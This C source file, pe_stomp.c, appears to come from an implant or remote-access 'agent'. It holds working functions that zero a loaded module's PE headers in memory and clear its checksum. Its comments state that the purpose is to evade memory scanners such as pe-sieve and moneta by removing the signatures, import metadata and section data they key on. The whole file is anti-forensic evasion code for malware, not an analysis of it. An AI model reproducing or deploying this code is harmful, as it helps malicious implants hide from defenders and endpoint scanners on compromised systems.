/*
 * pe_stomp.c — PE header stomping implementation.
 *
 * After agent initialization, the PE headers in memory serve no purpose.
 * Zeroing them:
 *   - Prevents tools like pe-sieve/moneta from identifying the image as a PE
 *   - Removes import table metadata
 *   - Removes section names, sizes, and characteristics
 *   - Removes the MZ/PE signatures that scanners key on
 *
 * The actual code/data sections are untouched — only the metadata header
 * region (typically the first page, 0x1000 bytes) is zeroed.
 */
#include "agent.h"
#include "pe_stomp.h"

BOOL pe_stomp_module(HMODULE hMod) {
    if (!hMod) return FALSE;

    unsigned char *base = (unsigned char *)hMod;

    /* Validate before stomping — make sure it's actually a PE */
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    /*
     * Calculate total header size.
     * SizeOfHeaders from OptionalHeader tells us how much space the
     * headers + section table occupy. This is typically one page (4096).
     */
    DWORD headerSize = nt->OptionalHeader.SizeOfHeaders;
    if (headerSize == 0 || headerSize > 0x10000) {
        /* Sanity check — headers shouldn't be > 64KB */
        headerSize = 0x1000;  /* Default to one page */
    }

    /* Make headers writable */
    DWORD oldProtect;
    if (!VirtualProtect(base, headerSize, PAGE_READWRITE, &oldProtect))
        return FALSE;

    /* Zero the entire header region */
    SecureZeroMemory(base, headerSize);

    /* Restore original protection (typically PAGE_READONLY) */
    VirtualProtect(base, headerSize, oldProtect, &oldProtect);

    return TRUE;
}

BOOL pe_stomp_self(void) {
    HMODULE hSelf = GetModuleHandleA(NULL);
    if (!hSelf) return FALSE;
    return pe_stomp_module(hSelf);
}

BOOL pe_zero_checksum(HMODULE hMod) {
    if (!hMod) return FALSE;

    unsigned char *base = (unsigned char *)hMod;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    /* Checksum is at OptionalHeader + 0x40 (offset within NT headers) */
    DWORD *pChecksum = &nt->OptionalHeader.CheckSum;

    DWORD oldProtect;
    SIZE_T region = sizeof(DWORD);
    void *pBase = (void *)pChecksum;

    if (!VirtualProtect(pBase, region, PAGE_READWRITE, &oldProtect))
        return FALSE;

    *pChecksum = 0;

    VirtualProtect(pBase, region, oldProtect, &oldProtect);

    return TRUE;
}
